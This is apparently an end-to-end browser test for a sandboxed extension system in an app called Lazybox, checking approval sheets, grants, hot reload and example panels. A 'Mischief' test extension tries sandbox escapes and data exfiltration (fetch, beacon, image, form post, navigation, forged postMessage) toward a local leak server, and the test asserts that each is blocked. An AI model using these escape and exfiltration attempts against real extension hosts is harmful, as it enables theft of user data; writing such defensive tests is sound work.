// Fixture only: sandboxed panel extensions (EXTENSIONS.md). From an empty
// Extensions panel, the person adds the Agent board example, reads exactly
// what it may do in the approval sheet and allows it; the board renders in its
// sandboxed frame with the theme's tokens, reads what needs the person, shows
// a conversation and opens the inbox through the bridge; a call outside its
// grants is refused and said quietly in the panel; saving one of its files
// reloads it. A malicious extension cannot reach Lazybox's document or
// storage, navigate the window, open a popup, submit a form, run inline code,
// reach a host that was not approved (by fetch, image or navigating its own
// frame), or pass for the panel's shell; a host that was approved works.
// Settings → Extensions turns it off. Screenshots dark and light:
// .cache/extensions-*.png. WebKit, the browser build, the fake Runner; the
// content origin and its policies are real (policy.json), the Runner's parser
// and credential checks are the Go tests'.
import { testViteCache } from './fixtures/vite-cache.mjs';
import { createServer } from './fixtures/vite-cache.mjs';
import { createServer as createHttp } from 'node:http';
import react from '@vitejs/plugin-react';
import { webkit, expect } from './fixtures/playwright.mjs';
import { fileURLToPath } from 'node:url';
import { mkdir } from 'node:fs/promises';
import assert from 'node:assert/strict';
import { startRunnerFixture } from './fixtures/runner-ui.mjs';
import { collectPageErrors, drainPageErrors } from './fixtures/page-errors.mjs';

const listen = handler => new Promise(resolve => { const s = createHttp(handler); s.listen(0, '127.0.0.1', () => resolve(s)); });
// Where a malicious extension would send what it read: nothing may arrive.
const leaks = [];
const leak = await listen((req, res) => { leaks.push(req.url); res.writeHead(200, { 'Access-Control-Allow-Origin': '*', 'Content-Type': 'text/html' }); res.end('<h1>leaked</h1>'); });
const approved = await listen((req, res) => { res.writeHead(200, { 'Access-Control-Allow-Origin': '*', 'Content-Type': 'application/json' }); res.end('{"ok":true}'); });
const LEAK = `http://127.0.0.1:${leak.address().port}`, APPROVED = `http://127.0.0.1:${approved.address().port}`;

const f = await startRunnerFixture();
// Something needs the person: a question waiting in Beta.
Object.assign(f.sessions.find(s => s.id === 'beta-session'), { title: 'Pick the database', status: 'waiting_input', pending: [{ type: 'question', requestId: 'q-db', text: 'Postgres or SQLite?' }] });
Object.assign(f.sessions.find(s => s.id === 'alpha-session'), { title: 'Fix the parser' });
const server = await createServer({ ...testViteCache(import.meta.url), configFile: false, logLevel: 'error', root: fileURLToPath(new URL('../apps/web', import.meta.url)), plugins: [react()], server: { host: '127.0.0.1', port: 0, proxy: { '/lazybox.bench.v1.RunnerService/': { target: f.url } } } });
await server.listen(); await mkdir('.cache', { recursive: true });
const shown = `http://127.0.0.1:${server.httpServer.address().port}/?view=workspace&collection=alpha&session=alpha-session`;
const url = `${shown}#token=${f.token}`;

// Its script runs once the page is parsed (defer, as the examples do): lazybox.ready can answer before
// the parser reaches <body> on a slow machine, and #out would not exist yet.
await f.extensions.addFolder('mischief', {
  'extension.yaml': `lazybox: 1\nname: Mischief\nversion: 0.0.1\ndescription: A test extension that tries what it must not.\npanels:\n  - id: main\n    title: Mischief\n    entry: index.html\ngrants:\n  - read:sessions\nnetwork:\n  - ${APPROVED}\n`,
  'index.html': `<!doctype html><html><head><meta charset="utf-8"><title>Mischief</title><link rel="stylesheet" href="_lazybox/lazybox.css"><script src="_lazybox/lazybox.js"></script><script>window.inlineRan = true;</script><style>body { outline: 9px solid red; }</style><script src="app.js" defer></script></head><body><h1>Mischief</h1><p id="out">…</p><form id="form" action="${LEAK}/form" method="post"><input name="q" value="secret"></form></body></html>`,
  'app.js': `window.appRan = true; lazybox.ready.then(info => { document.getElementById('out').textContent = 'hello ' + info.grants.join(','); });`,
});

const shellOf = page => page.frames().find(frame => frame.url().includes('/_lazybox/shell.html'));
const innerOf = (page, name = 'index.html') => page.frames().find(frame => frame.parentFrame() && frame.parentFrame().url().includes('/_lazybox/shell.html') && frame.url().endsWith(name));
async function inner(page, name) { let frame; await expect.poll(() => { frame = innerOf(page, name); return !!frame; }, { timeout: 8000 }).toBe(true); return frame; }

async function scenario(browser, scheme, full) {
  const context = await browser.newContext({ viewport: { width: 1440, height: 900 }, colorScheme: scheme });
  const page = await context.newPage();
  page.setDefaultTimeout(10000);
  const errors = []; await collectPageErrors(page, errors);
  const shot = name => page.screenshot({ path: `.cache/extensions-${name}-${scheme}.png` });
  await page.goto(url);
  await expect(page.locator('.page-layout .panel-chat').getByRole('textbox', { name: 'Message', exact: true })).toBeEnabled();

  if (full) {
    f.runnerSettings.notices = ['disk-pressure-critical'];
    await page.evaluate(() => window.dispatchEvent(new Event('lazybox-settings-saved')));
    await expect(page.getByRole('status', { name: 'Disk space is critically low on this Runner' })).toBeVisible();
    const warning = page.getByRole('status', { name: 'Disk space is critically low on this Runner' });
    await warning.getByRole('button', { name: 'Dismiss' }).click();
    await expect(warning).toHaveCount(0);
    await page.reload();
    await expect(page.locator('.page-layout .panel-chat').getByRole('textbox', { name: 'Message', exact: true })).toBeEnabled();
    await expect(warning).toHaveCount(0);
    f.runnerSettings.notices = ['disk-pressure-tight'];
    await page.evaluate(() => window.dispatchEvent(new Event('lazybox-settings-saved')));
    await expect(page.getByRole('status', { name: 'Running low on disk space on this Runner' })).toBeVisible();
    f.runnerSettings.notices = [];
    await page.evaluate(() => window.dispatchEvent(new Event('lazybox-settings-saved')));
    await expect(page.getByRole('status', { name: 'Disk space is critically low on this Runner' })).toHaveCount(0);
  }
  // ---- An empty Extensions panel: the examples, one click to add.
  await page.locator('summary[aria-label="Panels"]').click();
  await page.getByRole('button', { name: 'New Extensions panel', exact: true }).click();
  const panel = page.locator('.extension-home, .extension-panel').first();
  if (full) {
    await expect(panel.getByRole('heading', { name: 'Available to install' })).toBeVisible();
    await expect(panel.getByText('Agent board', { exact: true })).toBeVisible();
    await expect(panel.getByText('Mischief', { exact: true })).toBeVisible(); // waiting for approval
    const search = panel.getByRole('searchbox', {name:'Search extensions'});
    const category = panel.getByRole('combobox', {name:'Extension category'});
    const installedOnly = panel.getByRole('checkbox', { name: 'Installed only' });
    await installedOnly.check();
    await expect(panel.getByRole('heading', { name: 'Available to install' })).toHaveCount(0);
    await installedOnly.uncheck();
    await search.fill('coding style');
    await expect(panel.getByText('Clone Me',{exact:true})).toBeVisible();
    await category.selectOption('Code & documentation');
    await expect(panel.getByText('No matching extensions.',{exact:false})).toBeVisible();
    await panel.getByRole('button',{name:'Clear filters'}).click();
    const preview = panel.locator('details').filter({has:page.getByLabel('Preview Agent board')});
    await preview.locator('summary').click();
    await expect(preview.locator('figure img')).toBeVisible();
    await preview.locator('summary').click();
    await shot('home');
    await panel.locator('li', { hasText: 'Agent board' }).getByRole('button', { name: 'Install' }).click();
  } else {
    // Approved already (the Runner keeps it): show the board, from the panel's own picker if it shows another.
    const picker = page.getByRole('combobox', { name: 'Extension panel' });
    if (await picker.count()) await picker.selectOption({ label: 'Agent board' });
    else await panel.locator('.extension-tile', { hasText: 'Agent board' }).click();
  }

  // ---- The approval sheet: exactly what it may do, in words.
  const sheet = page.getByRole('dialog', { name: 'Allow Agent board?' });
  if (full) {
    await expect(sheet).toBeVisible();
    const can = sheet.getByRole('list', { name: 'What it can do' });
    await expect(can.locator('li')).toHaveCount(4);
    for (const text of ['See what needs you', 'Show a conversation', 'Run “Next conversation that needs you”', 'Run “Open the inbox”']) await expect(can).toContainText(text);
    await expect(sheet).toContainText('Nothing: it cannot use the network.');
    await expect(sheet.getByRole('button', { name: 'Not now' })).toBeFocused();
    await shot('approval');
    await sheet.getByRole('button', { name: 'Allow and turn on' }).click();
    await expect(sheet).toHaveCount(0);
    assert.deepEqual(f.mutations.filter(m => m.method === 'ApproveExtension').at(-1).body, { id: 'agent-board', grants: ['read:attention', 'show:conversations', 'do:attention.next', 'do:inbox.open'] });
  }

  // ---- The board renders, sandboxed, with the theme's tokens, and reads what needs you.
  const frameEl = page.locator('iframe.extension-frame');
  await expect(frameEl).toHaveAttribute('sandbox', 'allow-scripts');
  const board = page.frameLocator('iframe.extension-frame').frameLocator('iframe');
  await expect(board.getByRole('region', { name: 'Needs you' }).getByRole('button', { name: /Pick the database/ })).toBeVisible();
  await expect(board.getByRole('heading', { name: /1 need you/ })).toBeVisible();
  const boardFrame = await inner(page);
  await board.getByRole('searchbox').fill('no-match-example');
  await expect(board.getByText('No conversations match your search.')).toBeVisible();
  await board.getByRole('searchbox').fill('');
  await board.getByLabel('Needs attention only').check();
  await expect(board.getByRole('region', { name: 'Working' })).toHaveCount(0);
  await expect(board.getByRole('region', { name: 'Needs you' })).toBeVisible();
  await board.getByLabel('Needs attention only').uncheck();
  assert.equal(await boardFrame.evaluate(() => lazybox.reminders.list().catch(error => error.code)), 'not-granted');
  const surface = await page.evaluate(() => getComputedStyle(document.querySelector('.extension-panel')).backgroundColor);
  await expect.poll(() => boardFrame.evaluate(() => getComputedStyle(document.body).backgroundColor)).toBe(surface);
  assert.equal(await boardFrame.evaluate(() => document.documentElement.dataset.scheme), scheme);
  await shot('board');

  if (full) {
    // ---- Through the bridge: show a conversation; open the inbox.
    await f.power.waitForWindow();
    // (A conversation of this workspace: showing one elsewhere moves to that workspace's page.)
    await board.getByRole('button', { name: /Fix the parser/ }).click();
    await expect.poll(() => [...f.power.requests.values()].some(r => r.request.kind === 'open' && r.request.sessionId === 'alpha-session' && r.request.state === 'done')).toBe(true);
    await board.getByRole('button', { name: 'Inbox' }).click();
    await expect.poll(() => [...f.power.requests.values()].some(r => r.request.kind === 'do' && r.request.actionId === 'inbox.open' && r.request.state === 'done')).toBe(true);
    await page.keyboard.press('Escape');

    // ---- A call outside its grants: refused, said once, quietly, with the way to review.
    const refused = await (await inner(page)).evaluate(() => lazybox.messages.send('alpha-session', 'from the board').then(() => 'sent', e => `${e.name}:${e.code}:${e.grant}`));
    assert.equal(refused, 'LazyboxError:not-granted:send:messages');
    const notice = page.locator('.extension-notice').filter({ hasText: 'asked to send messages as you' });
    await expect(notice).toBeVisible();
    await expect(notice.getByRole('button', { name: 'Review access' })).toBeVisible();
    assert.equal(f.calls.some(c => c.method === 'Apply' && c.extension), false, 'no message reached the Runner');
    await shot('refused');
    await notice.getByRole('button', { name: 'Dismiss' }).click();
    // The Runner's own check, past the bridge: the credential reaches nothing else.
    const credential = [...f.extensions.creds.keys()].at(-1);
    for (const method of ['GetSession', 'Apply', 'ListExtensions', 'ApproveExtension', 'ReadCommand']) {
      const r = await fetch(`${f.url}/lazybox.bench.v1.RunnerService/${method}`, { method: 'POST', headers: { authorization: `Bearer ${credential}`, 'content-type': 'application/json' }, body: '{"sessionId":"alpha-session","operationId":"x","message":{"text":"hi"}}' });
      assert.equal(r.status, 403, method);
    }

    // ---- Hot reload: a save in an editor reloads the panel.
    await (await inner(page)).evaluate(() => { window.__before = true; });
    await f.extensions.writeFile('agent-board', 'board.css', (await import('node:fs')).readFileSync(fileURLToPath(new URL('../services/runner/code/internal/power/extensions/examples/agent-board/board.css', import.meta.url)), 'utf8') + '\n.bar h1 { letter-spacing: .02em; }\n');
    await expect.poll(async () => { const frame = innerOf(page); return frame ? frame.evaluate(() => window.__before === undefined && !!document.querySelector('.column')).catch(() => false) : false; }, { timeout: 8000 }).toBe(true);

    // ---- A malicious extension: approved for one host and read:sessions only.
    await page.getByRole('combobox', { name: 'Extension panel' }).selectOption({ label: 'All extensions…' });
    await page.locator('.extension-home li', { hasText: 'Mischief' }).getByRole('button', { name: 'Enable…' }).click();
    const mischiefSheet = page.getByRole('dialog', { name: 'Allow Mischief?' });
    await expect(mischiefSheet.getByRole('list', { name: 'Where it can connect' })).toContainText('A service on this computer');
    await expect(mischiefSheet).toContainText('What it can see, it could send to these sites.');
    await shot('approval-network');
    await mischiefSheet.getByRole('button', { name: 'Allow and turn on' }).click();
    const mischief = page.frameLocator('iframe.extension-frame').frameLocator('iframe');
    await expect(mischief.getByText('hello read:sessions')).toBeVisible();
    const evil = await inner(page);
    const results = await evil.evaluate(async ({ LEAK, APPROVED }) => {
      const r = {};
      const attempt = async (name, fn) => { try { r[name] = `allowed:${await fn()}`; } catch (e) { r[name] = `blocked:${e.name}`; } };
      r.inline = window.inlineRan === true ? 'ran' : 'blocked';
      r.inlineStyle = getComputedStyle(document.body).outlineStyle === 'solid' ? 'applied' : 'blocked';
      await attempt('parentDocument', () => parent.document.title);
      await attempt('topDocument', () => top.document.title);
      await attempt('localStorage', () => localStorage.length);
      await attempt('cookie', () => { document.cookie = 'a=1'; return document.cookie; });
      await attempt('topNavigation', () => { top.location.href = LEAK + '/top'; return 'set'; });
      r.popup = String(window.open(LEAK + '/popup'));
      await attempt('fetchLeak', () => fetch(LEAK + '/fetch').then(x => x.status));
      await attempt('fetchApproved', () => fetch(APPROVED + '/ok').then(x => x.json()).then(x => x.ok));
      await attempt('beacon', () => navigator.sendBeacon(LEAK + '/beacon', 'x'));
      await attempt('image', () => new Promise((resolve, reject) => { const img = new Image(); img.onload = () => resolve('loaded'); img.onerror = () => reject(Object.assign(new Error('x'), { name: 'Blocked' })); img.src = LEAK + '/img'; }));
      await attempt('importLeak', () => import(LEAK + '/module.js'));
      await attempt('form', () => { document.getElementById('form').submit(); return 'submitted'; });
      await attempt('sessions', () => lazybox.sessions.list().then(x => x.conversations.length));
      await attempt('send', () => lazybox.messages.send('alpha-session', 'leak'));
      // Pass for the shell, or post straight to the app: ignored.
      top.postMessage({ lazybox: 1, from: 'shell', event: 'blocked', data: { uri: 'forged' } }, '*');
      top.postMessage({ lazybox: 1, id: 'forged', method: 'messages.send', params: { sessionId: 'alpha-session', text: 'forged' } }, '*');
      parent.postMessage({ lazybox: 1, id: 'forged2', method: 'messages.send', params: { sessionId: 'alpha-session', text: 'forged' } }, '*');
      return r;
    }, { LEAK, APPROVED });
    assert.equal(results.inline, 'blocked', 'an inline script ran');
    assert.equal(results.inlineStyle, 'blocked', 'an inline style applied');
    for (const name of ['parentDocument', 'topDocument', 'localStorage', 'cookie', 'topNavigation', 'fetchLeak', 'image', 'importLeak', 'send']) assert.match(results[name], /^blocked:/, `${name}: ${results[name]}`);
    assert.equal(results.popup, 'null');
    assert.equal(results.fetchApproved, 'allowed:true');
    assert.equal(results.sessions.startsWith('allowed:'), true, results.sessions);
    // sendBeacon only queues (it may answer true); the leak server below says whether anything left.
    // The app takes the bearer out of the address bar once it reads it, so the window shows `shown`.
    assert.equal(page.url(), shown, 'the window was navigated');
    await expect(page.locator('.extension-notice').filter({ hasText: 'forged' })).toHaveCount(0);
    // Nothing the screenshots or the page injected is reported as the extension leaving.
    await expect(page.locator('.extension-notice').filter({ hasText: 'tried to leave' })).toHaveCount(0);
    // Leaving its page for another site: blocked by the shell, and said.
    await evil.evaluate(LEAK => { location.href = LEAK + '/navigate?secret=1'; }, LEAK);
    await expect(page.locator('.extension-notice').filter({ hasText: `tried to leave its panel for ${LEAK}` })).toBeVisible();
    await page.waitForTimeout(500);
    assert.deepEqual(leaks, [], `requests reached the leak server: ${leaks}`);
    assert.equal(f.calls.some(c => c.method === 'Apply'), false, 'a forged message reached the Runner');
    await shot('blocked');

    // ---- Settings → Extensions: the list, and turning one off.
    await page.keyboard.press('Meta+,');
    await page.getByRole('tab', { name: 'Extensions' }).click();
    const card = page.getByRole('listitem', { name: 'Mischief' });
    await expect(card).toContainText('On');
    await expect(page.getByRole('listitem', { name: 'Agent board' })).toContainText('See what needs you');
    const clone = page.getByRole('list',{name:'Available extensions'}).locator('li').filter({has:page.getByText('Clone Me',{exact:true})});
    await clone.getByRole('button',{name:'Install',exact:true}).click();
    await page.getByRole('dialog',{name:'Allow Clone Me?'}).getByRole('button',{name:'Allow and turn on'}).click();
    await page.getByRole('button',{name:'Teach Clone Me'}).click();
    const interview = page.getByRole('dialog',{name:'Teach Clone Me'});
    await interview.getByRole('button',{name:'I prefer explicit errors.'}).click();
    await expect(interview.getByLabel('How do you like code structured?')).toHaveValue('I prefer explicit errors.');
    await interview.getByRole('button',{name:'Learn from recent conversations'}).click();
    await interview.getByLabel('How should agents test error paths?', { exact: true }).fill('Use table-driven tests.');
    await interview.getByRole('combobox', { name: 'Save answer under for How should agents test error paths?' }).selectOption('testing');
    await interview.getByRole('checkbox',{name:/Forget in Workspace A: Naming convention/}).check();
    await interview.getByRole('button',{name:'Save preferences'}).click();
    await expect(interview).toHaveCount(0);
    const savedClone = f.mutations.findLast(m => m.method === 'SaveCloneProfile').body;
    assert.deepEqual(savedClone.forgetAnswerIds, ['w/naming']);
    assert.match(savedClone.profile.testing, /Use table-driven tests\./);
    assert.doesNotMatch(savedClone.profile.style, /Use table-driven tests\./);
    await shot('settings');
    await card.getByRole('switch').click();
    await expect(card.getByRole('switch')).not.toBeChecked();
    await expect(card).toContainText('Off');
    assert.deepEqual(f.mutations.filter(m => m.method === 'SetExtensionEnabled').at(-1).body, { id: 'mischief' });
  }
  if (!full) {
    // What an approved extension may do, from its panel; then Settings.
    await page.getByRole('button', { name: 'What Agent board may do' }).click();
    const access = page.getByRole('dialog', { name: 'What Agent board may do' });
    await expect(access.getByRole('button', { name: 'Done' })).toBeFocused();
    await shot('access');
    await access.getByRole('button', { name: 'Done' }).click();
    const extensions = page.getByRole('navigation', { name: 'Pages' }).getByRole('button', { name: 'Extensions', exact: true });
    await extensions.click();
    await expect(extensions).toHaveAttribute('aria-current', 'page');
    await expect(page.getByRole('listitem', { name: 'Mischief' })).toContainText('Off');
    await expect(page.getByRole('listitem', { name: 'Mischief' }).getByRole('button', { name: /^Open / })).toHaveCount(0);
    await page.getByRole('button', { name: 'Browse panels' }).click();
    await page.getByRole('button', { name: 'Manage extensions', exact: true }).click();
    await expect(extensions).toHaveAttribute('aria-current', 'page');
    await page.getByRole('listitem', { name: 'Agent board' }).getByRole('button', { name: 'Open Agent board' }).click();
    await expect(page.frameLocator('iframe.extension-frame').frameLocator('iframe').getByRole('region', { name: 'Needs you' })).toBeVisible();
    await page.keyboard.press('Meta+k');
    const palette = page.getByRole('dialog', { name: 'Command palette' });
    await palette.getByRole('combobox', { name: 'Search commands' }).fill('plugins');
    await palette.getByRole('option', { name: /Extensions settings/ }).click();
    await expect(extensions).toHaveAttribute('aria-current', 'page');
    await shot('settings');
    await f.extensions.handle('InstallExampleExtension', { example: 'disk-cleanup' });
    await f.extensions.handle('ApproveExtension', { id: 'disk-cleanup', grants: ['scan:disk'] });
    f.runnerSettings.notices = ['disk-pressure-critical'];
    await page.evaluate(() => window.dispatchEvent(new Event('lazybox-settings-saved')));
    await page.getByRole('status', { name: 'Disk space is critically low on this Runner' }).getByRole('button', { name: 'Open Disk Cleanup' }).click();
    const cleanup = page.frameLocator('iframe.extension-frame').frameLocator('iframe');
    await expect(page.getByRole('button', { name: 'Restore layout' }).first()).toBeVisible();
    await expect(page.locator('.page-layout .panel-agents')).toBeHidden();
    await expect(page.locator('.page-layout .panel-chat')).toBeHidden();
    await expect(cleanup.getByText('Waiting for the first scan.')).toBeVisible();
    await page.getByRole('button', { name: 'Restore layout' }).first().click();
    await expect(page.locator('.page-layout .panel-agents')).toBeVisible();
    f.runnerSettings.notices = [];
  }
  // WebKit reports the malicious frame's refused top navigation on the page; nothing else may fail.
  await drainPageErrors(errors);
  assert.deepEqual(errors.filter(e => !/Unsafe JavaScript attempt to initiate navigation .* from frame with URL 'http:\/\/127\.0\.0\.1:\d+\/x\//.test(e)), []);
  await context.close();
}

let browser;
try {
  browser = await webkit.launch();
  await scenario(browser, 'dark', true);
  await scenario(browser, 'light', false);
  const page = await browser.newPage();
  const errors = []; await collectPageErrors(page, errors);
  await page.goto(url);
  await page.locator('summary[aria-label="Panels"]').click();
  await page.getByRole('button', { name: 'New Extensions panel', exact: true }).click();
  await page.locator('.extension-home li', { hasText: 'Reminders' }).getByRole('button', { name: 'Install' }).click();
  await page.getByRole('dialog', { name: 'Allow Reminders?' }).getByRole('button', { name: 'Allow and turn on' }).click();
  const reminders = page.frameLocator('iframe.extension-frame').frameLocator('iframe');
  await expect(reminders.getByText('No reminders scheduled.')).toBeVisible();
  const tomorrowMorning = await page.evaluate(() => {
    const date = new Date();
    date.setDate(date.getDate() + 1);
    date.setHours(9, 0, 0, 0);
    return date.toISOString();
  });
  await reminders.getByLabel('Remind me').selectOption('tomorrow');
  await reminders.getByLabel('What should you check?').fill('Morning follow-up');
  await reminders.getByLabel('What should you check?').press('Enter');
  const morning = reminders.getByRole('listitem').filter({ hasText: 'Morning follow-up' });
  await expect(morning.locator('time')).toHaveAttribute('datetime', tomorrowMorning);
  await morning.getByRole('button', { name: 'Cancel' }).click();
  await reminders.getByLabel('Remind me').selectOption('15');
  await reminders.getByLabel('What should you check?').fill('Check the build');
  await reminders.getByRole('button', { name: 'Set reminder' }).click();
  await expect(reminders.locator('#scheduled')).toContainText('Check the build');
  const frame = await inner(page);
  assert.match(await frame.evaluate(() => lazybox.reminders.create('Past', 1).catch(e => e.message)), /future time/);
  await reminders.getByLabel('What should you check?').fill('Cancel this');
  await reminders.getByRole('button', { name: 'Set reminder' }).click();
  const cancelled = reminders.getByRole('listitem').filter({ hasText: 'Cancel this' });
  await cancelled.getByRole('button', { name: 'Cancel' }).click();
  await expect(cancelled).toHaveCount(0);

  const revoked = await frame.evaluate(() => lazybox.reminders.create('Disabled follow-up', Date.now() + 3600000));

  // Set a short deadline through the same SDK used by the panel and leave it.
  await frame.evaluate(() => lazybox.reminders.create('Review results', Date.now() + 1500));
  await page.getByRole('combobox', { name: 'Extension panel' }).selectOption({ label: 'Agent board' });
  const live = page.locator('.account-notice').filter({ hasText: 'Review results' });
  await expect(live).toBeVisible();
  await expect(live.locator('small')).toContainText('Reminders ·');
  await live.getByRole('button', { name: 'Done' }).click();
  await page.goto('about:blank');
  await page.clock.install({ time: new Date(Date.now() + 16 * 60000) });
  await page.goto(url);
  const due = page.locator('.account-notice').filter({ hasText: 'Check the build' });
  await expect(due).toBeVisible();
  await due.getByRole('button', { name: 'Done' }).click();
  await f.extensions.handle('SetExtensionEnabled', { id: 'reminders', enabled: false });
  await page.reload();
  await expect.poll(() => page.evaluate(id => Object.keys(localStorage).some(key => key.endsWith(':' + id)), revoked)).toBe(false);
  await expect(page.locator('.page-layout')).toBeVisible();
  await expect(due).toHaveCount(0);
  await drainPageErrors(errors);assert.deepEqual(errors, [], 'no page errors in the reminders panel');
  async function installPanel(name) {
    await page.getByRole('combobox', { name: 'Extension panel' }).selectOption({ label: 'All extensions…' });
    const row = page.locator('.extension-home li').filter({ has: page.getByText(name, { exact: true }) });
    await row.getByRole('button', { name: 'Install' }).click();
    await page.getByRole('dialog', { name: 'Allow ' + name + '?' }).getByRole('button', { name: 'Allow and turn on' }).click();
    return page.frameLocator('iframe.extension-frame').frameLocator('iframe');
  }
  const preview = await installPanel('Preview Desk');
  await expect(preview.getByRole('button', { name: 'Review repository setup' }).first()).toBeVisible();
  await preview.getByLabel('Ready previews only').check();
  await expect(preview.getByText('No previews are ready.')).toBeVisible();
  await preview.getByLabel('Ready previews only').uncheck();
  const filter = preview.getByRole('searchbox', { name: 'Filter list' });
  await filter.fill('no-matching-service');
  await expect(preview.getByText('No matching items.')).toBeVisible();
  await filter.fill('');
  await expect(preview.getByRole('listitem').first()).toBeVisible();
  const reads = () => f.extensions.calls.filter(call => call.extension === 'preview-desk' && call.method === 'GetWorkspaceRuntime').length;
  const before = reads();
  await preview.getByRole('button', { name: 'Refresh' }).click();
  await expect.poll(reads).toBeGreaterThan(before);
  const mailbox = await installPanel('Mailbox');
  await mailbox.getByRole('button', { name: 'Needs you 1' }).click();
  await expect(mailbox.getByRole('listitem')).toHaveCount(1);
  await expect(mailbox.getByRole('listitem')).toContainText('Review the retry policy');
  await mailbox.getByRole('button', { name: 'All unread 2' }).click();
  await expect(mailbox.getByRole('listitem')).toHaveCount(2);
  const releases = await installPanel('Release Watch');
  await expect(releases.getByRole('listitem').first()).toContainText('Production');
  await expect(releases.getByRole('button', { name: 'Review deployment' })).toBeVisible();
  const bootstrap = await installPanel('Workspace Bootstrap');
  await bootstrap.getByLabel(/Needs attention only/).check();
  await expect(bootstrap.getByRole('listitem')).toHaveCount(1);
  await expect(bootstrap.getByRole('listitem')).toContainText('1 missing file');
  const radar = await installPanel('Runner Radar');
  await radar.getByRole('combobox').selectOption('needs-input');
  await expect(radar.getByRole('button', { name: 'Respond' }).first()).toBeVisible();
  f.artifacts.agentPut({ collectionId: 'alpha', sessionId: 'alpha-session', kind: 'notes', title: 'Handoff checklist', content: 'Verify deployment.' });
  const handoff = await installPanel('Handoff Brief');
  const include = handoff.getByRole('button', { name: 'Include Handoff checklist' });
  await expect(include).toHaveAttribute('aria-pressed', 'true');
  await include.click();
  await expect(include).toHaveAttribute('aria-pressed', 'false');
  await drainPageErrors(errors);
  assert.deepEqual(errors, [], 'workflow panels produced no page errors');
  await page.close();
  console.log('extensions: ok');
} finally {
  await browser?.close();
  await server.close();
  await f.close();
  leak.close(); approved.close();
}
